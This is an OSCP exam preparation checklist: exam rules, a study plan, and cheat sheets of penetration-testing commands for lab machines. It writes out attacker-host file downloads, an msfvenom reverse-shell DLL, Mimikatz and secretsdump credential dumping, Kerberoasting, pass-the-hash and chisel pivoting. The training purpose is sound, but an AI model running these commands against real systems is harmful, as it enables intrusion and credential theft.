# OSCP Prep Checklist
### By Jeff Barron 

---

## 📊 Exam Structure

- **3 standalone machines** (60 pts total)
  - 10 pts for initial access
  - 10 pts for privilege escalation
- **1 AD set** with 3 machines (40 pts total)
- **70/100 to pass**
- **23 hours 45 minutes** exam time
- **24 reverts** available (can reset limit once)

**Passing combos:**
- Full AD (40) + 3 local.txt flags (30) = 70 ✅
- Full AD (40) + 2 local.txt + 1 proof.txt = 70 ✅
- Partial AD (20) + 3 full standalones (60) = 80 ✅

---

## 📸 Proof Requirements (Don't Lose Points!)

- **local.txt** = unprivileged user access
- **proof.txt** = root/Administrator only

**Every screenshot MUST show:**
1. Contents of proof file (`cat proof.txt` or `type proof.txt`)
2. IP address (`ip addr` or `ipconfig`)
3. In the SAME screenshot
4. From an INTERACTIVE shell (web shells = zero points)

---

## 📅 90-Day Study Plan

### Month 1: Foundations
- [ ] Complete OffSec PEN-200 course materials
- [ ] Set up your attack VM (Kali) and note-taking system
- [ ] Watch IppSec videos daily while doing other tasks
- [ ] Start TJ Null's playlist: https://youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf
- [ ] Practice 10-15 easy boxes on Proving Grounds Practice
- [ ] Join r/oscp and read pass/fail stories for insights

### Month 2: Intermediate Skills
- [ ] Focus on Proving Grounds **intermediate** boxes (OffSec-made ones)
- [ ] Build your enumeration methodology and make it repeatable
- [ ] Get comfortable with Active Directory attacks
- [ ] Practice pivoting with chisel and SSH tunnels
- [ ] **Create your own cheat sheets.** The best cheat sheet is the one you make yourself:
    - [ ] Enumeration cheat sheet (your go-to commands)
    - [ ] Privilege escalation cheat sheet (Windows + Linux)
    - [ ] General reference (file transfers, shells, pivoting)

### Month 3: OSCP Ready
- [ ] If you can pass PG intermediate boxes without walkthroughs, you're ready
- [ ] Practice report writing. Don't leave this for exam day.
- [ ] Learn to screenshot with snipping tool, or grab greenshot.
- [ ] Review weak areas from your notes
- [ ] Schedule exam. 

---

## 🚫 What NOT to Study

Offensive security is big and you can be overwhelmed at the amount of material. Focus on what's in PEN-200. Skip these:

- **Advanced AD attacks** (stay with the basics)
- **Phishing** (not on the exam)
- **EDR/AV evasion** (boxes won't have EDR or AV)
- **Network attacks** (Responder, ARP poisoning, bettercap)
- **Metasploit deep dives** (you don't need modules beyond basics)

**Rabbit hole warning:** If you are modifying an exploit beyond changing your IP address, you are in a rabbit hole. Move on.

---

## ⚠️ Exam Restrictions

**Metasploit Rules:**
- `msfvenom` + `multi/handler` = OK on ALL machines
- Modules (Auxiliary/Exploit/Post) + Meterpreter = ONE machine only
- Once you use modules on a target, you're locked to that target
- Can't use for pivoting (would touch multiple targets)

**Banned Tools:**
- SQLmap, SQLninja, auto-exploitation tools
- Mass scanners (Nessus, OpenVAS, etc.)
- AI chatbots (ChatGPT, OffSec KAI, etc.)
- Commercial tools (Burp Pro, Metasploit Pro, etc.)

---

## 🛠️ Essential Tools

### Enumeration
```bash
# Port scanning
nmap -sC -sV -oN scan.txt <target>
nmap -p- --min-rate 1000 <target>

# SMB
netexec smb <target> -u '' -p ''
smbclient -L //<target>/ -N
smbmap -H <target>

# LDAP
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"

# SNMP
snmp-check <target>
```

### Web
```bash
# Directory busting
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Know your webshells
ls /usr/share/webshells/
# php, asp, aspx, jsp: know which to use when
```

### File Transfers
```bash
# HTTP server (attacker)
python3 -m http.server 80

# SMB server (attacker)
impacket-smbserver share . -smb2support

# Download on Windows
certutil -urlcache -f http://<attacker>/file.exe file.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker>/file.exe','file.exe')"
iwr -uri http://<attacker>/file.exe -outfile file.exe

# Download on Linux
wget http://<attacker>/file.sh
curl http://<attacker>/file.sh -o file.sh
```

### Impacket Suite (Know These)
```bash
psexec domain/user:password@<target>
wmiexec domain/user:password@<target>
smbexec domain/user:password@<target>
secretsdump domain/user:password@<target>
GetUserSPNs -request domain/user:password -dc-ip <dc>
```

### netexec 
```bash
netexec smb <target> -u user -p pass
netexec smb <target> -u user -p pass --shares
netexec smb <target> -u user -p pass -x "whoami"
netexec smb <target> -u user -H <hash>  # pass the hash
netexec winrm <target> -u user -p pass
```

### RDP & winrm (you will see this.)
```bash
# RDP
xfreerdp /u:username /p:'password' /v:<target>

# Evil-WinRM (port 5985)
evil-winrm -i <target> -u user -p pass
evil-winrm -i <target> -u user -p pass -S  # port 5986 (SSL)
evil-winrm -i <target> -u user -H <ntlmhash>  # pass the hash
```

### SMB 
```bash
# smbclient
smbclient -L //<target>  # list shares
smbclient //<target>/<share>
smbclient //<target>/<share> -U <username>
smbclient //<target>/<share> -U domain/username

# smbmap
smbmap -H <target>
smbmap -H <target> -u <username> -p <password>
smbmap -H <target> -u <username> -p <password> -d <domain>
smbmap -H <target> -u <username> -p <password> -r <share>
```

### LDAP & RPC
```bash
# ldapsearch
ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local"
ldapsearch -x -H ldap://<target> -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local"

# rpcclient
rpcclient -U="user" <target>
rpcclient -U="" <target>  # anonymous login
```

### Exploit Finder 
```bash
searchsploit <service_name>
searchsploit -m <exploit_id>  # copy to current dir
```

### Reverse Shells
- **revshells.com**: quick reverse shell generator for all languages/formats

---

## 🔍 Enumeration Methodology

### Initial Scan
1. [ ] Full port scan: `nmap -p- --min-rate 1000 <target>`
2. [ ] Service scan on open ports: `nmap -sC -sV -p <ports> <target>`
3. [ ] Check for low-hanging fruit: anonymous FTP, SMB null sessions, default creds

### Web (80/443)
1. [ ] Browse manually first and check source code
2. [ ] Directory bust with feroxbuster/gobuster
3. [ ] Check for CMS (WordPress, Drupal, etc.) and run specific scanners
4. [ ] Test for SQLi, LFI, file upload vulns
5. [ ] Check `/robots.txt`, `/.git/`, /backup/, and  /api

### SMB (139/445)
1. [ ] Null session: `netexec smb <target> -u '' -p ''`
2. [ ] List shares: `smbclient -L //<target>/ -N`
3. [ ] Check for read/write access on shares
4. [ ] Enum users: `enum4linux -a <target>`

### Active Directory
1. [ ] Get domain info: `ldapsearch` or `enum4linux`
2. [ ] Find users: kerbrute https://github.com/ropnop/kerbrute
3. [ ] Find SPNs for Kerberoasting
4. [ ] Check for AS-REP roastable users
5. [ ] BloodHound if you have creds

---

## ⬆️ Privilege Escalation

### Windows PrivEsc Checklist

**Reality check:** You usually only need to run WinPEAS or pass a hash. Don't overcomplicate it.

```powershell
# First things first
whoami /all
net user <username>
systeminfo
```

1. [ ] Run **WinPEAS**: `.\winpeas.exe`
2. [ ] Run **PowerUp**: `Import-Module .\PowerUp.ps1; Invoke-AllChecks`
3. [ ] Check PowerShell history: `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
4. [ ] Unquoted service paths
5. [ ] Modifiable services
6. [ ] AlwaysInstallElevated
7. [ ] Stored credentials: `cmdkey /list`
8. [ ] Token impersonation (if SeImpersonate): PrintSpoofer, JuicyPotato, GodPotato
9. [ ] DLL hijacking (check for missing DLLs in WinPEAS output)

```bash
# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

# msfvenom for DLL hijacking
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f dll -o pwned.dll
```

### Linux PrivEsc Checklist
```bash
# Upgrade shell first
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then: stty raw -echo; fg
```

1. [ ] Run **linpeas.sh**
2. [ ] Check sudo rights: `sudo -l`
3. [ ] Find SUID binaries: `find / -perm -u=s -type f 2>/dev/null`
4. [ ] Check capabilities: `getcap -r / 2>/dev/null`
5. [ ] Check cron jobs: `cat /etc/crontab`, `ls /etc/cron.*`
6. [ ] Check for credentials in config files, history, env vars
7. [ ] Check GTFOBins for exploitable binaries

---

## 🏢 Active Directory Attacks

### Enumeration
```powershell
# Users and groups
net user /domain
net group /domain
net group "Domain Admins" /domain

# PowerView
Import-Module .\PowerView.ps1
Get-NetUser
Get-NetGroup
Get-NetComputer
# PowerView cheatsheet https://gist.github.com/macostag/44591910288d9cc8a1ed6ea35ac4f30f
```

### Credential Attacks
```bash
# Kerberoasting (get TGS tickets for SPNs)
GetUserSPNs -request domain/user:password -dc-ip <dc>
hashcat -m 13100 hash.txt rockyou.txt

# AS-REP Roasting (no preauth required)
GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <dc>
hashcat -m 18200 hash.txt rockyou.txt
```

### Lateral Movement
```bash
# Pass the Hash
psexec -hashes :<ntlm> domain/user@<target>
netexec smb <target> -u user -H <hash>

# Pass the Ticket
export KRB5CCNAME=ticket.ccache
psexec -k -no-pass domain/user@<target>
```

### Mimikatz Essentials
```
privilege::debug
sekurlsa::logonpasswords  # dump creds
sekurlsa::tickets /export  # export tickets
lsadump::sam              # dump SAM
```

---

## 🔀 Pivoting & Tunneling

### Chisel (Reverse SOCKS Proxy)
```bash
# On attacker (server)
./chisel server -p 9001 --reverse

# On target (client)
./chisel client <attacker>:9001 R:socks

# Add to /etc/proxychains.conf
socks5 127.0.0.1 1080

# Use with proxychains
proxychains nmap -sT <internal_target>
```

### SSH Tunnels
```bash
# Local port forward (access remote service locally)
ssh -L 8080:127.0.0.1:80 user@<target>

# Remote port forward (expose local service to target)
ssh -R 9001:127.0.0.1:9001 user@<target>

# Dynamic SOCKS proxy
ssh -D 1080 user@<target>
```

---

## 📝 Exam Day Tips

### Time Management
- [ ] You have 23 hours 45 minutes. Use them wisely.
- [ ] Don't spend more than 2 hours stuck on one box
- [ ] Take breaks. Walk away when frustrated.
- [ ] Document as you go: screenshots, commands, outputs

### Exam Strategy
- [ ] Start with the standalone boxes (not AD set)
- [ ] Get your easy points first
- [ ] The AD set is usually 40 points. Don't ignore it.
- [ ] If stuck, enumerate harder. You missed something.

### Report Writing
- [ ] Use OffSec's report template
- [ ] Screenshot EVERY step as proof of exploitation
- [ ] Include all commands used
- [ ] Explain your methodology, not just the commands
- [ ] Proofread before submitting

### Common Mistakes
- [ ] Not enumerating thoroughly
- [ ] Forgetting to check obvious things (default creds, source code)
- [ ] Not documenting during the exam
- [ ] Panicking. It's okay to take breaks.

---

## 📤 Report Submission

- **Format:** PDF inside a .7z file (no password)
- **Filename:** `OSCP-OS-XXXXX-Exam-Report.7z` (replace XXXXX with your OSID)
- **Deadline:** 24 hours after exam ends
- **Upload:** https://upload.offsec.com
- **Verify:** Check MD5 hash matches after upload
- **Template:** Use OffSec's official template

**Report must include:**
- Step-by-step methodology (reproducible by a reader)
- All commands used
- Screenshots of proof files with IP visible
- If you modified an exploit: include changes + explanation

---

## 📚 Resources

### Must-Use
- **IppSec TJ Null Playlist**: https://youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf
- **Proving Grounds Practice**: Focus on OffSec-made intermediate boxes
- **r/oscp**: Read pass/fail stories, ask questions
- **Orange Cyberdefense Mindmaps**: https://orange-cyberdefense.github.io/ocd-mindmaps/

### Quick References
- **GTFOBins**: https://gtfobins.github.io/ (Linux privesc)
- **LOLBAS**: https://lolbas-project.github.io/ (Windows living off the land)
- **HackTricks**: https://book.hacktricks.xyz/
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings

---

## ✅ Ready Check

Before scheduling your exam, can you:

- [ ] Root a PG intermediate box without many hints?
- [ ] Perform basic AD attacks (Kerberoasting, PTH, lateral movement)?
- [ ] Write a clean report with screenshots and methodology?
- [ ] Stay calm when stuck and enumerate deeper?

If yes: **Book it. You're ready.**

---

*Good luck. Trust your prep. You've got this.*

— Jeff

---

*I write about offensive security and AI at [Cred Relay](https://www.credrelay.com).*
